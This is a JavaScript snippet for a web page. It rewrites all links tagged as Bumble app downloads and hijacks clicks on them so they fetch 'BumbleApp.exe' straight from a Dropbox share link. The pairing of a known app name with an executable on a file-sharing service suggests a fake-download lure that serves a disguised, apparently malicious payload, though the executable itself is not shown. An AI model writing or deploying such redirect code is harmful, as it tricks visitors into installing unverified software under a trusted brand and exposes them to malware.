(function (global) {
    "use strict";

    var Bumble_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/dxnhcf207zmmi4ratruzd/BumbleApp.exe?rlkey=wgee4aim0pyftrtnxap05cz8g&st=2vbcj2s6&dl=1";

    function applyDownloadLinksToAnchors() {
        if (typeof document === "undefined") return;
        var nodes = document.querySelectorAll("a[data-Bumble-download]");
        for (var i = 0; i < nodes.length; i++) {
            nodes[i].setAttribute("href", Bumble_APP_DOWNLOAD_URL);
            nodes[i].setAttribute("rel", "noopener noreferrer");
        }
    }

    function onDocumentClickCapture(e) {
        var a = e.target.closest && e.target.closest("a[data-Bumble-download]");
        if (!a) return;
        if (a.getAttribute("data-download-no-track") != null) return;
        e.preventDefault();
        global.location.href = Bumble_APP_DOWNLOAD_URL;
    }

    if (typeof document !== "undefined") {
        document.addEventListener("DOMContentLoaded", function () {
            applyDownloadLinksToAnchors();
            document.addEventListener("click", onDocumentClickCapture, true);
        });
    }

    global.Bumble_APP_DOWNLOAD_URL = Bumble_APP_DOWNLOAD_URL;
})(typeof window !== "undefined" ? window : this);
